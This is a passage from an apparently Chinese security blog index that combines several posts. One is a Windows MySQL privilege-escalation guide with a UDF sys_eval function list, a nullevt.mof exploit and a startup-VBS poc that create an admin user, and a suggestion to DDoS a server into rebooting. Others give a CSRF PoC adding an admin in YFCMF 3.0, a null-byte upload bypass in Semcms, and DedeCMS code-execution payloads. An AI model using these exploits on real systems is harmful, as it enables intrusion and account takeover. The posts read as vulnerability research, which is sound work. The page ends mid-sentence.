<h3 id="将udf的自定义函数引入"><a href="#将udf的自定义函数引入" class="headerlink" title="将udf的自定义函数引入"></a>将udf的自定义函数引入</h3><p>我们刚才只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
<p>引入sys_eval函数：</p>
<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;hpudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，hpudf.dll是你导出文件的名字;</p>
<p>常见的函数如下：</p>
<pre><code>cmdshell 执行cmd;

downloader 下载者,到网上下载指定文件并保存到指定目录;

open3389 通用开3389终端服务,可指定端口(不改端口无需重启);

backshell 反弹Shell;

ProcessView 枚举系统进程;

KillProcess 终止指定进程;

regread 读注册表;

regwrite 写注册表;

shut 关机,注销,重启;

about 说明与帮助函数;</code></pre><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令模板：</p>
<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>添加用户/管理员<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224507-4fc7644c-9987-1.png" alt></p>
<p>查看一下用户<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224525-5ad82b8c-9987-1.png" alt></p>
<p>get it~</p>
<h1 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h1><p>MOF提权的条件要求十分严苛：</p>
<ol>
<li>windows 03及以下版本</li>
<li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li>
<li>secure-file-priv参数不为null</li>
</ol>
<p>mysql以root身份启动，具有c盘下system32/wbem/mof这点权限的要求，就已经非常严格了。。而且win7 sp1就已经没有这个nullevt.mof这个文件了，那么这里记一下poc，来对windows 03的机子进行验证。</p>
<h2 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h2><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。</p>
<h2 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h2><p>MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
<h2 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h2><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
instance of __EventFilter as $EventFilter
{
EventNamespace = &quot;Root\\Cimv2&quot;;
Name = &quot;filtP2&quot;;
Query = &quot;Select * From __InstanceModificationEvent &quot;
&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
&quot;And TargetInstance.Second = 5&quot;;
QueryLanguage = &quot;WQL&quot;;
};
instance of ActiveScriptEventConsumer as $Consumer
{
Name = &quot;consPCSV2&quot;;
ScriptingEngine = &quot;JScript&quot;;
ScriptText =
&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;
};
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};</code></pre><h2 id="MOF文件利用"><a href="#MOF文件利用" class="headerlink" title="MOF文件利用"></a>MOF文件利用</h2><p>将上面的脚本上传到有读写权限的目录下：</p>
<p>这里我上传到了<code>C:\Documents and Settings\test</code></p>
<p>根据前面的phpmyadmin，我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下<br>payload:</p>
<pre><code>select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</p>
<h2 id="验证提权"><a href="#验证提权" class="headerlink" title="验证提权"></a>验证提权</h2><p>当我们成功把mof导出时，mof就会直接被执行，且5秒创建一次用户。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224611-75eaad5a-9987-1.png" alt><br>可以看到，我们在test的普通用户下直接添加了hpdoger用户。剩下的操作就是用户命令处，换成加入administrator语句即可：</p>
<pre><code>net.exe user localgroup administrator hpdoger /add\</code></pre><h2 id="关于Mof提权的弊端"><a href="#关于Mof提权的弊端" class="headerlink" title="关于Mof提权的弊端"></a>关于Mof提权的弊端</h2><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p>
<p>cmd 下运行下面语句:</p>
<pre><code>net stop winmgmt
del c:/windows/system32/wbem/repository
net start winmgmt</code></pre><p>重启服务即可。</p>
<h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><p>在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和mof几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用mysql写文件，写入一段VBS代码到开机自启动中，服务器重启达到创建用户并提权，可以使用DDOS迫使服务器重启。</p>
<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><p>file_priv 不为null<br>已知root密码</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>create table a (cmd text); 
insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); 
insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); 
insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); 
select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有很多cve这里没有复现到。Mysql提权在如今被各种因素限制，但掌握这一门技术或多或少对我们都还是有所帮助的</p>

                
            </div>
            <div class="continue">
            <a href="/2018/09/08/基于Windows下mysql的一些提权分析/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/"> 
                    Phpstorm + phpstudy + Xdebug代码审计环境 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-25   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>硬着头皮挖了一些，也算是完成了之前一个月内出cve的任务：<br>1、YFCMF:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16431" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16431</a><br>2、SQL in Bluecms1.6:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16432" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16432</a><br>3、XSS in Semcms:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16433" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16433</a><br>4、SQL in Semcms:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16434" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16434</a></p>
<p>但想学好代码审计还有很长的路要走，勿忘初心，开始正题~</p>
<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h3 id="安装php-xdebug-dll"><a href="#安装php-xdebug-dll" class="headerlink" title="安装php_xdebug.dll"></a>安装php_xdebug.dll</h3><p>phpstudy自带各版本的xdebug.dll插件</p>
<p>在相应目录，如5.6.27版本下的在：phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll</p>
<h3 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h3><p>php.ini在相应目录，如5.6.27版本下的在：\phpStudy\PHPTutorial\php\php-5.6.27-nts\php.ini</p>
<p>在Xdebug部分加如下内容：</p>
<pre><code>[XDebug]
zend_extension=&quot;D:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll&quot;
xdebug.profiler_append = 0
xdebug.profiler_enable = 1
xdebug.profiler_enable_trigger = 0
xdebug.profiler_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;
xdebug.trace_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;
xdebug.profiler_output_name = &quot;cache.out.%t-%s&quot;
xdebug.remote_enable = 1
xdebug.remote_handler = &quot;dbgp&quot;
xdebug.remote_host = &quot;127.0.0.1&quot;
xdebug.remote_port = 9000
xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.remote_port = 9000 : Xdebug监听地址<br>xdebug.idekey = PHPSTORM： idekey名称（与后面设置对应）</p>
<h3 id="设置php解释器"><a href="#设置php解释器" class="headerlink" title="设置php解释器"></a>设置php解释器</h3><p>![](Delete Link<br><a href="https://i.loli.net/2018/08/25/5b8157cb1f00f.png" target="_blank" rel="noopener">https://i.loli.net/2018/08/25/5b8157cb1f00f.png</a>)</p>
<p>这里我用的是5.6.27版本的</p>
<h3 id="设置xdebug参数"><a href="#设置xdebug参数" class="headerlink" title="设置xdebug参数"></a>设置xdebug参数</h3><p>Debug里设置监听地址：<br><img src="https://i.loli.net/2018/08/25/5b8157cb63338.jpg" alt></p>
<p>接着设置代理：<br><img src="https://i.loli.net/2018/08/25/5b8157cb56aba.jpg" alt></p>
<h3 id="配置Debug"><a href="#配置Debug" class="headerlink" title="配置Debug"></a>配置Debug</h3><p>运行–&gt;编辑配置</p>
<p>Defaults–&gt;Web Page<br><img src="https://i.loli.net/2018/08/25/5b8157cb673a3.png" alt></p>
<p>新增一个服务端，填写信息如图，要点击应用和确认<br><img src="https://i.loli.net/2018/08/25/5b8157cb55242.png" alt></p>
<p>回到上级页面后别忘了选择刚才添加的server</p>
<h3 id="浏览器安装debug插件"><a href="#浏览器安装debug插件" class="headerlink" title="浏览器安装debug插件"></a>浏览器安装debug插件</h3><p>下面我是使用火狐的插件xdebug-ext进行调试，因为审计用得比较多的就是火狐了插件多</p>
<p>IDE key也要对应上我们的配置：<br><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpstorm6.png" alt></p>
<h2 id="调试测试"><a href="#调试测试" class="headerlink" title="调试测试"></a>调试测试</h2><h3 id="新建一个工程"><a href="#新建一个工程" class="headerlink" title="新建一个工程"></a>新建一个工程</h3><h3 id="浏览器开启debug"><a href="#浏览器开启debug" class="headerlink" title="浏览器开启debug"></a>浏览器开启debug</h3><p>在需要debug的页面点击右上图标为红色时：<br><img src="https://i.loli.net/2018/08/25/5b8158615412d.jpg" alt></p>
<h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><h3 id="phpstorm开启debug"><a href="#phpstorm开启debug" class="headerlink" title="phpstorm开启debug"></a>phpstorm开启debug</h3><p>点击右上角的小电话开启，再点左边的绿色甲壳虫图标进行调试</p>
<p>传参后看结果<br><img src="https://i.loli.net/2018/08/25/5b81588414c88.png" alt></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/23/Csrf in YFCMF 3.0/"> 
                    Csrf in YFCMF 3.0 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-23   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The background administrator adds CSRF to the page, causing other administrator accounts to add.</p>
<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre><code>&lt;html&gt;
    &lt;form action=&quot;/YFCMF/admin/admin/adminsave.html&quot; method=&quot;post&quot;&gt;
        &lt;select name=&quot;group_id&quot; required=&quot;&quot;&gt;
            &lt;option value=&quot;2&quot;/&gt;
        &lt;/select&gt;
        &lt;input name=&quot;username&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
        &lt;input name=&quot;password&quot; value=&quot;123&quot; type=&quot;hidden&quot;/&gt;
        &lt;input name=&quot;email&quot; value=&quot;csrf@1.com&quot; type=&quot;hidden&quot;/&gt;
        &lt;input name=&quot;realname&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
    &lt;/form&gt;
    &lt;script&gt;
        document.forms[0].submit();
    &lt;/script&gt;
&lt;/html&gt;</code></pre><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>1、View original users<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7c4f4.png" alt></p>
<p>2、Accessing structured CSRF pages<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7ded1.png" alt></p>
<p>3、Successfully added<br><img src="https://i.loli.net/2018/08/23/5b7e6aac970b0.png" alt><br><img src="https://i.loli.net/2018/08/23/5b7e6aacc099b.png" alt></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/23/Csrf in YFCMF 3.0/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/23/Arbitrary File upload in Semcms V2.7/"> 
                    Arbitrary File upload in Semcms V2.7 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-23   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>php Background pages restrict the type of uploaded files, jpe, gif, rar,we can break through the restrictions on uploading malicious files such as: PHP.</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>The affected code(located:/ciuy_Admin/SEMCMS_Upfile.php):</p>
<pre><code>$newname=test_input($_POST[&quot;wname&quot;]).&quot;.&quot;.end($uptype)</code></pre><p>We could control the “wname” as we want,and uptype is the suffix which intercepted in allow</p>
<h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The attaking founction:use char(0) to cut off the filename and make up a renew suffix</p>
<p>The affected page located in admin’s management page:<code>ciuy_Admin/SEMCMS_Upfile.php</code></p>
<h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>First,we define our evil php’s suffix as test.rar(which is allowed) and post it as follow.There,we could see no files in the Folder</p>
<p>Second,we change the php as php0x00 and the effection as :<br><img src="https://i.loli.net/2018/08/23/5b7e13304a88d.png" alt></p>
<p>final effection and poc:<br><img src="https://i.loli.net/2018/08/23/5b7e13ba8c3e3.jpg" alt><br><img src="https://i.loli.net/2018/08/23/5b7e141646860.jpg" alt></p>
<p>Then, we could see the test.php in the folder:<br><img src="https://i.loli.net/2018/08/23/5b7e142f6dfac.png" alt></p>
<p>Finally, we could use tools (Cknife) to link the evil php<br><img src="https://i.loli.net/2018/08/23/5b7e147a46853.png" alt></p>
<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>This is a background getshell process. The required PHP version is less than 5.3</p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/23/Arbitrary File upload in Semcms V2.7/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/21/Dedecms V5.7 SP2代码审计/"> 
                    Dedecms V5.7 SP2代码审计 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-21   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>首发于安全客：<a href="https://www.anquanke.com/post/id/157522" target="_blank" rel="noopener">代码审计入门级DedecmsV5.7 SP2分析复现</a></p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>Dedecms的洞有很多，而最新版的v5.7 sp2更新止步于1月。作为一个审计小白,看过《代码审计-企业级Web代码安全构架》后，偶然网上冲浪看到mochazz师傅在blog发的审计项目,十分有感触。跟着复现了两个dedecms代码执行的cve,以一个新手的视角重新审视这些代码，希望文章可以帮助像我这样入门审计不久的表哥们。文章若有片面或不足的地方还请师傅们多多斧正</p>
<h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>php5.45 + mysql<br>审计对象：DedeCMS V5.7 SP2<br>工具：seay源码审计</p>
<h2 id="后台代码执行"><a href="#后台代码执行" class="headerlink" title="后台代码执行"></a>后台代码执行</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell</p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>漏洞位置：dede/tpl.php</p>
<p>看一下核心代码：</p>
<pre><code># /dede/tpl.php
&lt;?php
require_once(dirname(__FILE__).&quot;/config.php&quot;);
CheckPurview(&#39;plus_文件管理器&#39;);

$action = isset($action) ? trim($action) : &#39;&#39;;
......
if(empty($filename))    $filename = &#39;&#39;;
$filename = preg_replace(&quot;#[\/\\\\]#&quot;, &#39;&#39;, $filename);
......
else if($action==&#39;savetagfile&#39;)
{
    csrf_check();
    if(!preg_match(&quot;#^[a-z0-9_-]{1,}\.lib\.php$#i&quot;, $filename))
    {
        ShowMsg(&#39;文件名不合法，不允许进行操作！&#39;, &#39;-1&#39;);
        exit();
    }
    require_once(DEDEINC.&#39;/oxwindow.class.php&#39;);
    $tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);
    $content = stripslashes($content);
    $truefile = DEDEINC.&#39;/taglib/&#39;.$filename;
    $fp = fopen($truefile, &#39;w&#39;);
    fwrite($fp, $content);
    fclose($fp);
    ......
}</code></pre><p>因为dedecms全局变量注册(register_globals=on)，这里有两个可控变量$filename&amp;$content</p>
<p>action=savetag时，进行csrf()检测</p>
<pre><code>function csrf_check()
{
    global $token;

    if(!isset($token) || strcasecmp($token, $_SESSION[&#39;token&#39;]) != 0){
        echo &#39;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&#39;;
        exit;
    }
}</code></pre><p>验证token和已知的session是否相等，那么token的值从何获取呢？</p>
<p>回溯tpl.php，追踪一下token：</p>
<pre><code>else if ($action == &#39;upload&#39;)
{
        ....
        &lt;input name=&#39;acdir&#39; type=&#39;hidden&#39; value=&#39;$acdir&#39;  /&gt;
        &lt;input name=&#39;token&#39; type=&#39;hidden&#39; value=&#39;{$_SESSION[&#39;token&#39;]}&#39;  /&gt;
        &lt;input name=&#39;upfile&#39; type=&#39;file&#39; id=&#39;upfile&#39; style=&#39;width:380px&#39; /&gt;
}</code></pre><p>当action=upload时，隐藏表单的value提交token值<br><img src="https://s1.ax1x.com/2018/08/21/PIOS7n.png" alt></p>
<p>token搞定了，再让我们继续往下审~</p>
<pre><code>$truefile = DEDEINC.&#39;/taglib/&#39;.$filename;</code></pre><p>传入的filename必须为 xxxx.lib.php，并且保存的也是php文件</p>
<pre><code>    fwrite($fp, $content);
    fclose($fp);</code></pre><p>写入内容为$content…那岂不是为所欲为..<br>poc:</p>
<pre><code>http://localhost/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;filename=hpdoger.lib.php&amp;content=&lt;?php phpinfo();?&gt;&amp;token=55f2eb0ad241e1893276ed1f8e7dd5fa</code></pre><p>在include/taglib下会产生相应xxx.lib.php</p>
<h2 id="后台代码执行Getshell"><a href="#后台代码执行Getshell" class="headerlink" title="后台代码执行Getshell"></a>后台代码执行Getshell</h2><h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>问题代码位于：/uploads/plus/ad_js.php</p>
<pre><code> */
require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;);

if(isset($arcID)) $aid = $arcID;
$arcID = $aid = (isset($aid) &amp;&amp; is_numeric($aid)) ? $aid : 0;
if($aid==0) die(&#39; Request Error! &#39;);

$cacheFile = DEDEDATA.&#39;/cache/myad-&#39;.$aid.&#39;.htm&#39;;
if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )
{
    $row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&#39;$aid&#39; &quot;);
    $adbody = &#39;&#39;;
    if($row[&#39;timeset&#39;]==0)
    {
        $adbody = $row[&#39;normbody&#39;];
    }
    else
    {
        $ntime = time();
        if($ntime &gt; $row[&#39;endtime&#39;] || $ntime &lt; $row[&#39;starttime&#39;]) {
            $adbody = $row[&#39;expbody&#39;];
        } else {
            $adbody = $row[&#39;normbody&#39;];
        }
    }
    $adbody = str_replace(&#39;&quot;&#39;, &#39;\&quot;&#39;,$adbody);
    $adbody = str_replace(&quot;\r&quot;, &quot;\\r&quot;,$adbody);
    $adbody = str_replace(&quot;\n&quot;, &quot;\\n&quot;,$adbody);
    $adbody = &quot;&lt;!--\r\ndocument.write(\&quot;{$adbody}\&quot;);\r\n--&gt;\r\n&quot;;
    $fp = fopen($cacheFile, &#39;w&#39;);
    fwrite($fp, $adbody);
    fclose($fp); 
}
include $cacheFile;</code></pre><p>摘出关键语句：</p>
<pre><code>if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )</code></pre><p>要求$nocache存在，又可以利用前面的全局变量注册</p>
<p>往下走Getone()函数进行sql查询，返回一个结果集。</p>
<p>而后把取到的值和当前的时间点对比作为判断条件，决定取表中的normbody还是exbody赋值给$adbody。</p>
<p>接着就比较明朗了..将$adbody写入文件，而文件名我们抓包应该就可以知道。</p>
<p>但是这里我只看了这一个文件，现在整理一下思路：<br>1、给出一个$aid进行sql查询<br>2、根据查询值判断\写文件，且文件内容可控，目录已知<br>3、最后把写入的文件包含进来。</p>
<p>那么，我们这个$aid从何处传入数据库呢？随着这个思路追踪文件到：/dede/ad_add.php</p>
<p>一个编辑页面，抓包看一下键值对应，顺便瞅一眼mysql载入的数据<br><img src="https://s1.ax1x.com/2018/08/22/PTGGdO.jpg" alt><br>看到这里知道，清楚exbody和normbody对应的都是什么了</p>
<p>依据代码<code>$row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&#39;$aid&#39; &quot;);</code>查看dede__myad这个库插入的内容：<br><img src="https://s1.ax1x.com/2018/08/22/PTGJoD.png" alt></p>
<p>看到timeset=0，那么直接是取<code>$adbody = $row[&#39;normbody&#39;];</code>其实timeset何时都为0，浏览ad_add.php代码部分看到，存入数据库的timeset值就为0</p>
<p>ok 现在思路明确,开始复现</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>我们已经保存过一个页面了，直接poke一下<code>http://localhost/dedecms/uploads/plus/ad_js.php?aid=1</code>看看<br><img src="https://s1.ax1x.com/2018/08/22/PTGtFe.png" alt></p>
<p>查看写入文件：<code>http://localhost/dedecms/uploads/data/cache/myad-1.htm</code><br><img src="https://s1.ax1x.com/2018/08/22/PTGUWd.png" alt></p>
<p>htm文件成功写入，我们回到Ad_js来执行一下任意代码。不要忘记闭合前面的document文档注释语句<br>payload:</p>
<pre><code>hpdoger=echo &#39;--&gt;&#39;; phpinfo();</code></pre><p><img src="https://s1.ax1x.com/2018/08/22/PTGwQI.jpg" alt></p>
<h2 id="winapi查找后台目录"><a href="#winapi查找后台目录" class="headerlink" title="winapi查找后台目录"></a>winapi查找后台目录</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1、win系统下搭建的网站<br>2、网站后台目录存在/images/adminico.gif</p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>windows环境下查找文件基于Windows FindFirstFile的winapi函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。</p>
<p>利用方法很简单，我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。</p>
<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>核心文件：common.inc.php</p>
<pre><code>if($_FILES)
{
    require_once(DEDEINC.&#39;/uploadsafe.inc.php&#39;);
}</code></pre><p>追踪uploadsafe.inc.php</p>
<pre><code>if( preg_match(&#39;#^(cfg_|GLOBALS)#&#39;, $_key) )
{
    exit(&#39;Request var not allow for uploadsafe!&#39;);
}
$$_key = $_FILES[$_key][&#39;tmp_name&#39;]; //获取temp_name 
${$_key.&#39;_name&#39;} = $_FILES[$_key][&#39;name&#39;];
${$_key.&#39;_type&#39;} = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]);
${$_key.&#39;_size&#39;} = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]);
if(!empty(${$_key.&#39;_name&#39;}) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,${$_key.&#39;_name&#39;}) || !preg_match(&quot;#\.#&quot;, ${$_key.&#39;_name&#39;})) )
{
    if(!defined(&#39;DEDEADMIN&#39;))
    {
        exit(&#39;Not Admin Upload filetype not allow !&#39;);
    }
}
if(empty(${$_key.&#39;_size&#39;}))
{
    ${$_key.&#39;_size&#39;} = @filesize($$_key);
}
$imtypes = array
(
    &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, 
    &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot;
);
if(in_array(strtolower(trim(${$_key.&#39;_type&#39;})), $imtypes))
{
    $image_dd = @getimagesize($$_key); 
    //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。
    if (!is_array($image_dd))
    {
        exit(&#39;Upload filetype not allow !&#39;);
    }
}</code></pre><p>摘出这句：</p>
<pre><code> $image_dd = @getimagesize($$_key); </code></pre><p>进行判断$$_key是否为图片或图片是否存在</p>
<p>然而$$_key的来源是$_FILES[$_key][‘tmp_name’]，上文说了全局变量注册，$FILE可控，那我们传入一个$_FILES[$_key][‘tmp_name’]亦可控，此处是产生了一个变量覆盖的</p>
<p>接着再看同文件的代码</p>
<pre><code>    ${$_key.&#39;_name&#39;} = $_FILES[$_key][&#39;name&#39;];
    ${$_key.&#39;_type&#39;} = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]);
    ${$_key.&#39;_size&#39;} = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]);

    if(!empty(${$_key.&#39;_name&#39;}) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,${$_key.&#39;_name&#39;}) || !preg_match(&quot;#\.#&quot;, ${$_key.&#39;_name&#39;})) )
    {
        if(!defined(&#39;DEDEADMIN&#39;))
        {
            exit(&#39;Not Admin Upload filetype not allow !&#39;);
        }
    }</code></pre><p>其中,$cfg_not_allowall的范围如下：</p>
